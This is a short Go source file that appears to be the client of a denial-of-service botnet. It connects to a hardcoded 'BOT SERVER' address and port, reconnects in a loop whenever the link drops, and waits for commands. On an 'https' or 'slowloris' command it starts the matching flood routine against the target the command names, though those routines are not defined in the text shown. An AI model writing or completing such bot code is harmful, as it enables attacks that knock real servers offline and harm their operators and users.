package main

import (
	"fmt"
	"net"
	"strings"
	"sync"
)

const (
	TARGET_SERVER = "127.0.0.1" // BOT SERVER
	TARGET_PORT   = "9999"      // BOT PORT
)

var wg sync.WaitGroup

func main() {
CONNECT:
	connection, err := net.Dial("tcp", TARGET_SERVER+":"+TARGET_PORT)

	if err != nil {
		fmt.Println(err)
		goto CONNECT
	}

	for {

		command := make([]byte, 2048)

		_, err := connection.Read(command)
		if err != nil {
			goto CONNECT
		}

		commandd := strings.ReplaceAll(string(command), "\n", "")
		if strings.HasPrefix(commandd, "https") {

			args := strings.Split(commandd, " ")

			fmt.Println(args)

			go HttpsDefault(args[1], args[2], args[3])
		}

		if strings.HasPrefix(commandd, "slowloris") {

			args := strings.Split(commandd, " ")

			go Slowloris(args[1], args[2], args[3])
		}

	}
}
